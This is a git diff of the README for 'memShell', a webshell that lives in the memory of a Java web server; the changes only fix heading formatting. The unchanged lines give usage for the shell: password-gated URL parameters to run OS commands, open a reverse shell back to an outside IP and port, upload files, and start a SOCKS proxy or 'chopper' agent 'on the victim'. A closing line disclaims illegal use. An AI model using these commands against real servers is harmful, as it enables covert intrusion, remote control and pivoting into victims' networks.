@@ -1,7 +1,7 @@
 # memShell
 a webshell resides in the memory of java web server
 
-#Usage
+# Usage
 anyurl?pwd=pass //show this help page.
 anyurl?pwd=pass&model=exec&cmd=whoami  //run os command.
 anyurl?pwd=pass&model=connectback&ip=8.8.8.8&port=51 //reverse a shell back to 8.8.8.8 on port 51.
@@ -12,5 +12,5 @@ anyurl?pwd=pass&model=upload&path=/tmp/a.elf&content=this_is_content[&type=b]   
 anyurl?pwd=pass&model=proxy  //start a socks proxy server on the victim.
 anyurl?pwd=pass&model=chopper  //start a chopper server agent on the victim.
 
-#note
+# note
 For learning exchanges only, do not use for illegal purposes.by rebeyond.
